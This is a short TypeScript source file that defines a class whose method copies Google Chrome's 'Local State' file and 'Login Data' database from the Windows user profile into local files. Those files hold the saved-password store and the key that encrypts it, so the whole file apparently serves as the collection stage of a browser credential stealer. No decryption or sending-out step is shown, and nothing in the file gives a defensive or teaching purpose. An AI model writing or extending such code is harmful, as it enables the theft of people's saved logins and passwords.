import fs from 'fs'

export class IO {
  private localState = 'state.json'
  private loginData = 'database.db'

  constructor() {}

  public async checkChromeFiles() {
    const LOCAL_STATE = process.env.LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Local State'
    const LOGIN_DATA = process.env.LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Default\\Login Data'

    await fs.copyFileSync(LOCAL_STATE, 'state.json')
    await fs.copyFileSync(LOGIN_DATA, 'database.db')
  }

  public getLocalState() {
    return this.localState
  }

  public getLoginData() {
    return this.loginData
  }
}
